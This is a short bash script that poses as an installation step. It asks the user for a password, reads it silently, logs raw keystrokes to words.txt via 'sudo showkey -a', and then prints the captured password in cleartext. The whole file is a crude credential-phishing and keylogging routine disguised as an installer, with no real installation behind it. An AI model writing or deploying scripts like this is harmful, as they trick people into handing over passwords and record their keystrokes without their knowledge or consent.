#!/bin/bash
echo "please enter password for installation"
read -s pass 
sudo showkey -a > words.txt
echo $pass
